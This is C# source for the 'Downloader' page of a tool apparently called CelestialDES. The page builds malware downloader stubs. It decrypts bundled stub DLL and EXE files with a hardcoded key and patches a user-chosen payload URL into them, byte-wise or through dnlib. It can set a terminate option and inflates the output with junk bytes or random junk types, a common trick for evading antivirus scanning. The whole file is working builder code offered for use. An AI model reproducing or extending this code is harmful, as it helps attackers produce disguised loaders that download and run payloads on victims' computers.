using CelestialDES.Helper;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Notifications.Wpf;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Forms;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace CelestialDES.Pages
{
    /// <summary>
    /// Логика взаимодействия для Downloader.xaml
    /// </summary>
    public partial class Downloader : Page
    {
        public Downloader()
        {
            InitializeComponent();
        }

        private static string url;
        private static bool needterminate;
        private static bool arch64;

        public void Build_Click(object sender, RoutedEventArgs e)
        {
            needterminate = metroCheckBox1.IsChecked.Value;
            url = urlTextbox.Text;

            if ((cmbExt.Text.Length <= 0) || (url.Length <= 0)) return;

            var notificationManager = new NotificationManager();

            if (cmbExt.Text.Contains("dll"))
            {
                if (cmbArch.Text.Length <= 0) return;
                arch64 = cmbArch.Text.Contains("x64");
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".dll (*.dll)|*.dll";
                    saveFileDialog1.InitialDirectory = System.Windows.Forms.Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = false;
                    saveFileDialog1.FileName = "FinalDad";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            byte[] bytes;
                            if (arch64)
                            {
                                bytes = Encryption.Decompress(Encryption.Encrypt(File.ReadAllBytes(@"Data/6c.dll"), "paSsGeyJZ"));
                            }
                            else
                            {
                                bytes = Encryption.Decompress(Encryption.Encrypt(File.ReadAllBytes(@"Data/8c.dll"), "paSsGeyJZ"));
                            }

                            int urlVarAddress = FindPosition(bytes, "||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||");
                            if (urlVarAddress != -1)
                            {
                                byte[] newUrlBytes = System.Text.Encoding.Default.GetBytes(urlTextbox.Text);
                                Array.Copy(newUrlBytes, 0, bytes, urlVarAddress, newUrlBytes.Length);

                                if (needterminate)
                                {
                                    int terminateVarAddress = FindPosition(bytes, "123123123123|");
                                    if (terminateVarAddress != -1)
                                    {
                                        byte[] needterminatebytes = System.Text.Encoding.Default.GetBytes("1231231231231");
                                        Array.Copy(needterminatebytes, 0, bytes, terminateVarAddress, needterminatebytes.Length);
                                    }
                                    else
                                    {
                                        notificationManager.Show(new NotificationContent
                                        {
                                            Title = "exception",
                                            Message = "can't find address of terminate variable",
                                            Type = NotificationType.Error
                                        });
                                        return;
                                    }
                                }
                            }else
                            {
                                notificationManager.Show(new NotificationContent
                                {
                                    Title = "exception",
                                    Message = "can't find address of url variable",
                                    Type = NotificationType.Error
                                });
                                return;
                            }
                            int patchedsize = Encoding.Default.GetBytes(urlTextbox.Text).Length + Encoding.Default.GetBytes("1231231231231").Length;
                            notificationManager.Show(new NotificationContent
                            {
                                Title = "Success",
                                Message = "Successfully patched " + patchedsize + " bytes\nStub saved at " + saveFileDialog1.FileName,
                                Type = NotificationType.Success
                            });
                            File.WriteAllBytes(saveFileDialog1.FileName, bytes);
                            if (metroCheckBox2.IsChecked == true) JunkSizeFake(saveFileDialog1.FileName, Convert.ToInt32(PumpTextbox.Text));
                        }
                        catch (Exception ex) { System.Windows.MessageBox.Show(ex.Message); return; }
                    }
                    else return;
                }
            }
            else if (cmbExt.Text.Contains("exe"))
            {
                ModuleDefMD asmDef = null;

                using (asmDef = ModuleDefMD.Load(Encryption.Decompress(Encryption.Encrypt(File.ReadAllBytes(@"Data/d.exe"), "paSsGeyJZ"))))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = System.Windows.Forms.Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = false;
                    saveFileDialog1.FileName = "FinalDad";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        WriteSettings(asmDef, saveFileDialog1.FileName);
                        if (metroCheckBox2.IsChecked == true) JunkSize(asmDef, Convert.ToInt32(PumpTextbox.Text));
                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();
                        notificationManager.Show(new NotificationContent
                        {
                            Title = "Success",
                            Message = "Stub saved at " + saveFileDialog1.FileName,
                            Type = NotificationType.Success
                        });
                    }
                    else return;
                }
            }
        }

        private void JunkSizeFake(string module, int size)
        {
            try
            {
                FileInfo fileInfo = new FileInfo(module);
                long originalSize = fileInfo.Length;

                // Увеличиваем размер DLL файла
                int newSize = size * 1024; // Установите желаемый размер в байтах

                using (FileStream fileStream = fileInfo.OpenWrite())
                {
                    fileStream.SetLength(newSize);
                }
            }
            catch { }
        }

        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void JunkSize(ModuleDefMD moduleDefMD, int size)
        {
            if ((size < 1) || (size > 9999999)) return;

            for (int i = 0; i < size * 15; i++)
            {
                var junkatrb = new TypeDefUser(RandomString(50), moduleDefMD.CorLibTypes.Object.TypeDefOrRef);
                moduleDefMD.Types.Add(junkatrb);
            }
        }

        private void WriteSettings(ModuleDefMD asmDef, string AsmName)
        {
            try
            {
                foreach (TypeDef type in asmDef.Types)
                {
                    asmDef.Assembly.Name = System.IO.Path.GetFileNameWithoutExtension(AsmName);
                    asmDef.Name = System.IO.Path.GetFileName(AsmName);
                    if (type.Name == "Settings")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "[%url%]")
                                        method.Body.Instructions[i].Operand = urlTextbox.Text;
                                }
                            }
                        }
                }
            }
            catch { }
        }

        static int FindPosition(byte[] bytes, string pattern)
        {
            for (int i = 0; i < bytes.Length - pattern.Length + 1; i++)
            {
                bool match = true;

                for (int j = 0; j < pattern.Length; j++)
                {
                    if (bytes[i + j] != pattern[j])
                    {
                        match = false;
                        break;
                    }
                }

                if (match)
                {
                    return i;
                }
            }

            return -1;
        }

        private void ComboBox_DropDownClosed(object sender, EventArgs e)
        {
            if (cmbExt.SelectedIndex == 1) //sel ind already updated
            {
                // change sel Index of other Combo for example
                cmbArch.Visibility = Visibility.Visible;
                TextTerminate.Visibility = Visibility.Visible;
                metroCheckBox1.Visibility = Visibility.Visible;
                ArchText.Visibility = Visibility.Visible;
            }
            else { cmbArch.Visibility = Visibility.Hidden; TextTerminate.Visibility = Visibility.Hidden; metroCheckBox1.Visibility = Visibility.Hidden; ArchText.Visibility = Visibility.Hidden; }
        }

        private void PumpTextbox_PreviewTextInput(object sender, TextCompositionEventArgs e)
        {
            Regex regex = new Regex("[^0-9]+");
            e.Handled = regex.IsMatch(e.Text);
        }

        private static byte[] Decompress(byte[] data)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (GZipStream gzipStream = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
                {
                    gzipStream.CopyTo(memoryStream);
                }

                return memoryStream.ToArray();
            }
        }
    }
}
